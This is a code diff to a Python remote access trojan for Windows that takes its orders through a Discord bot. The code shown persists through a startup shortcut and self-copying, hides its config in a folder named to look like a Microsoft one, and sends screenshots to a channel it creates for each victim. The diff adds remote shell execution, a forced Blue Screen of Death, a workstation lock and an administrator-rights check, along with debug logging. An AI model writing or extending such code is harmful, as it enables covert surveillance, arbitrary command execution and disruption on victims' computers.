@@ -12,7 +12,14 @@ import socket
 import platform
 import getpass
 import configparser
+import logging
+import ctypes
+import traceback
 import psutil
+import winsound
+import winreg
+from comtypes import CLSCTX_ALL
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from PIL import ImageGrab
 from cryptography.fernet import Fernet
 import discord
@@ -29,7 +36,54 @@ appBuild = "__MARKER_APP_BUILD__"
 
 _K = b"__MARKER_TOKEN_KEY__"
 _C = b"__MARKER_TOKEN_ENC__"
-_TOKEN = Fernet(_K).decrypt(_C).decode()
+
+_TOKEN = ""
+try:
+    _TOKEN = Fernet(_K).decrypt(_C).decode()
+except Exception:
+    _TOKEN = ""
+
+if len(sys.argv) > 1:
+    args = sys.argv[1:]
+    i = 0
+    while i < len(args):
+        arg = args[i]
+        if arg in ("--build", "-b") and i + 1 < len(args):
+            appBuild = args[i + 1]
+            i += 2
+        elif arg in ("--token", "-t") and i + 1 < len(args):
+            _TOKEN = args[i + 1]
+            i += 2
+        elif arg.upper() == "DEBUG":
+            appBuild = "DEBUG"
+            DEBUG = True
+            i += 1
+        else:
+            if i == 0:
+                appBuild = arg
+                if appBuild.upper() == "DEBUG":
+                    DEBUG = True
+            elif i == 1 and not _TOKEN:
+                _TOKEN = arg
+            i += 1
+
+if appBuild.upper() == "DEBUG" or any(a.upper() == "DEBUG" for a in sys.argv[1:]):
+    DEBUG = True
+
+if DEBUG:
+    if sys.platform == "win32" and getattr(sys, "frozen", False):
+        try:
+            ctypes.windll.kernel32.AllocConsole()
+            sys.stdout = open("CONOUT$", "w", encoding="utf-8", buffering=1)
+            sys.stderr = open("CONOUT$", "w", encoding="utf-8", buffering=1)
+        except Exception:
+            pass
+
+logging.basicConfig(
+    level=logging.DEBUG if DEBUG else logging.INFO,
+    format="[%(asctime)s] [%(levelname)s] %(name)s: %(message)s"
+)
+logger = logging.getLogger("bot")
 
 GUILD_ID = 1530382256122761227
 CATEGORY_ID = 1530382256865284126
@@ -38,7 +92,8 @@ def get_config_path():
     local_appdata = os.environ.get("LOCALAPPDATA", os.path.expanduser("~"))
     folder = os.path.join(local_appdata, "Microsoft", "DeviceSync")
     os.makedirs(folder, exist_ok=True)
-    return os.path.join(folder, "sync.ini")
+    filename = "sync_debug.ini" if DEBUG else "sync.ini"
+    return os.path.join(folder, filename)
 
 def get_target_exe():
     local_appdata = os.environ.get("LOCALAPPDATA", os.path.expanduser("~"))
@@ -64,7 +119,8 @@ def load_config():
             os.remove(path)
             return None
         return {"prefix": prefix, "chid": chid, "version": version, "build": build}
-    except Exception:
+    except Exception as e:
+        logger.error(f"Failed to load config file '{path}': {e}")
         if os.path.exists(path):
             try:
                 os.remove(path)
@@ -83,6 +139,7 @@ def save_config(prefix, chid="", version="1.0", build=""):
     }
     with open(path, "w", encoding="utf-8") as f:
         cp.write(f)
+    logger.info(f"Saved configuration to '{path}'")
 
 def ensure_startup_shortcut(target_exe):
     try:
@@ -108,8 +165,8 @@ def ensure_startup_shortcut(target_exe):
         lnk.WorkingDirectory = os.path.dirname(target_exe)
         lnk.WindowStyle = 7
         lnk.Save()
-    except Exception:
-        pass
+    except Exception as e:
+        logger.error(f"Failed to ensure startup shortcut: {e}")
 
 def kill_existing_instances(target_exe):
     my_pid = os.getpid()
@@ -130,8 +187,8 @@ def spawn_detached(target_exe):
             subprocess.Popen([target_exe], creationflags=flags, close_fds=True)
         else:
             subprocess.Popen([target_exe])
-    except Exception:
-        pass
+    except Exception as e:
+        logger.error(f"Failed to spawn detached process: {e}")
 
 def generate_prefix():
     length = random.randint(2, 4)
@@ -299,6 +356,7 @@ async def on_message(message):
         return
     if str(message.channel.id) != cfg.get("chid", ""):
         return
+    logger.info(f"Received command: '{message.content}' from {message.author}")
     await bot.process_commands(message)
 
 @bot.command(name="help")
@@ -308,6 +366,12 @@ async def cmd_help(ctx):
     embed = discord.Embed(title="Available Commands", color=0x2b2d31)
     embed.add_field(name=f"{p}help", value="Show this help message", inline=False)
     embed.add_field(name=f"{p}ss", value="Capture and send a screenshot of the screen", inline=False)
+    embed.add_field(name=f"{p}ping", value="Check bot responsiveness", inline=False)
+    embed.add_field(name=f"{p}lock", value="Lock the workstation", inline=False)
+    embed.add_field(name=f"{p}beep", value="Play a beep sound", inline=False)
+    embed.add_field(name=f"{p}admincheck", value="Check if the current user has administrator privileges", inline=False)
+    embed.add_field(name=f"{p}bsod", value="Trigger a Blue Screen of Death (BSOD)", inline=False)
+    embed.add_field(name=f"{p}cmd <command>", value="Execute a shell command and return the output [EXPERIMENTAL]", inline=False)
     embed.add_field(name=f"{p}sysinfo", value="Display system information details", inline=False)
     await ctx.send(embed=embed)
 
@@ -320,8 +384,64 @@ async def cmd_ss(ctx):
         buf.seek(0)
         file = discord.File(fp=buf, filename="screenshot.png")
         await ctx.send(file=file)
-    except Exception:
+    except Exception as e:
+        logger.error(f"Failed to capture screenshot: {e}")
         await ctx.send("Failed to capture screenshot.")
+
+@bot.command(name="ping")
+async def cmd_ping(ctx):
+    await ctx.send("Pong!")
+
+@bot.command(name="lock")
+async def cmd_lock(ctx):
+    try:
+        ctypes.windll.user32.LockWorkStation()
+        await ctx.send("Workstation locked.")
+    except Exception as e:
+        logger.error(f"Failed to lock workstation: {e}")
+        await ctx.send("Failed to lock workstation.")
+
+
+@bot.command(name="beep")
+async def cmd_beep(ctx):
+    try:
+        winsound.Beep(1000, 500)
+        await ctx.send("Beep sound played.")
+    except Exception as e:
+        logger.error(f"Failed to play beep sound: {e}")
+        await ctx.send("Failed to play beep sound.")
+
+
+@bot.command(name="admincheck")
+async def cmd_admincheck(ctx):
+    try:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        await ctx.send(f"Administrator privileges: {'Yes' if is_admin else 'No'}")
+    except Exception as e:
+        logger.error(f"Failed to check admin privileges: {e}")
+        await ctx.send("Failed to check admin privileges.")
+
+@bot.command(name="bsod")
+async def cmd_bsod(ctx):
+    try:
+        ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
+        ctypes.windll.ntdll.NtRaiseHardError(0xC0000420, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
+    except Exception as e:
+        logger.error(f"Failed to trigger BSOD: {e}")
+        await ctx.send("Failed to trigger BSOD.")
+
+@bot.command(name="cmd")
+async def cmd_cmd(ctx, *, command: str):
+    try:
+        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
+        output = result.stdout.strip() + "\n" + result.stderr.strip()
+        output = output.strip() or "No output."
+        if len(output) > 1900:
+            output = output[:1900] + "\n...[truncated]"
+        await ctx.send(f"```\n{output}\n```")
+    except Exception as e:
+        logger.error(f"Failed to execute command '{command}': {e}")
+        await ctx.send(f"Failed to execute command: {e}")
 
 @bot.command(name="sysinfo")
 async def cmd_sysinfo(ctx):
@@ -339,6 +459,8 @@ async def on_ready():
         return
     _boot_completed = True
 
+    logger.info(f"Bot online as {bot.user} (ID: {bot.user.id}) | DEBUG={DEBUG} | Build={appBuild}")
+
     cfg = load_config()
     is_new = False
     if not cfg:
@@ -346,24 +468,29 @@ async def on_ready():
         save_config(prefix_val, "", appVersion, appBuild)
         cfg = {"prefix": prefix_val, "chid": "", "version": appVersion, "build": appBuild}
         is_new = True
+        logger.info(f"Created new configuration file '{get_config_path()}' with prefix '{prefix_val}'")
     else:
         prefix_val = cfg["prefix"]
+        logger.info(f"Loaded existing configuration file '{get_config_path()}' with prefix '{prefix_val}'")
 
     guild = bot.get_guild(GUILD_ID)
     if not guild:
         try:
             guild = await bot.fetch_guild(GUILD_ID)
-        except Exception:
+        except Exception as e:
+            logger.error(f"Failed to fetch guild {GUILD_ID}: {e}")
             guild = None
 
     if not guild:
+        logger.error("Guild not found!")
         return
 
     category = guild.get_channel(CATEGORY_ID)
     if not category:
         try:
             category = await bot.fetch_channel(CATEGORY_ID)
-        except Exception:
+        except Exception as e:
+            logger.warning(f"Category {CATEGORY_ID} not found: {e}")
             category = None
 
     channel = None
@@ -373,34 +500,39 @@ async def on_ready():
             channel = bot.get_channel(int(chid_str))
             if not channel:
                 channel = await bot.fetch_channel(int(chid_str))
-        except Exception:
+        except Exception as e:
+            logger.warning(f"Could not fetch channel ID {chid_str}: {e}")
             channel = None
 
     if not channel:
         try:
+            logger.info(f"Creating new Discord text channel for prefix '{prefix_val}'...")
             if category and hasattr(category, "create_text_channel"):
                 channel = await category.create_text_channel(name=prefix_val)
             else:
                 channel = await guild.create_text_channel(name=prefix_val, category=category)
             save_config(prefix_val, str(channel.id), appVersion, appBuild)
+            logger.info(f"Created channel '{prefix_val}' with ID {channel.id}")
             embed = get_sys_info(prefix_val)
             await channel.send(embed=embed)
-        except Exception:
-            pass
+        except Exception as e:
+            logger.error(f"Failed to create Discord text channel: {e}")
     else:
         try:
+            logger.info(f"Using Discord text channel ID {channel.id}")
             embed = create_online_embed(prefix_val)
             await channel.send(embed=embed)
-        except Exception:
-            pass
+        except Exception as e:
+            logger.error(f"Failed to send online notification to channel: {e}")
 
-    if getattr(sys, 'frozen', False):
+    if getattr(sys, 'frozen', False) and not DEBUG:
         target_exe = get_target_exe()
         current_exe = os.path.abspath(sys.executable)
         target_norm = os.path.normpath(target_exe).lower()
         current_norm = os.path.normpath(current_exe).lower()
 
         if current_norm != target_norm:
+            logger.info("Self-copying executable to target path...")
             kill_existing_instances(target_exe)
             time.sleep(0.5)
             copied = False
@@ -420,8 +552,30 @@ async def on_ready():
                 sys.exit(0)
         else:
             ensure_startup_shortcut(target_exe)
+    elif DEBUG:
+        logger.info("DEBUG mode active: Skipping self-copying, self-deletion, and startup shortcut persistence.")
 
 try:
-    bot.run(_TOKEN)
-except Exception:
-    pass
+    if not _TOKEN:
+        logger.error("NO DISCORD BOT TOKEN PROVIDED! Pass it via CLI or embed it during build.")
+    else:
+        logger.info("Starting bot execution...")
+        bot.run(_TOKEN)
+except Exception as e:
+    logger.error(f"Bot execution error: {e}")
+    traceback.print_exc()
+finally:
+    if DEBUG:
+        print("\n" + "=" * 50)
+        print("DEBUG MODE: Bot execution has ended. You can close this window or press Ctrl+C to exit.")
+        print("To close, manually close this terminal window.")
+        print("=" * 50)
+        while True:
+            try:
+                time.sleep(3600)
+            except KeyboardInterrupt:
+                break
+            except Exception:
+                pass
+
+
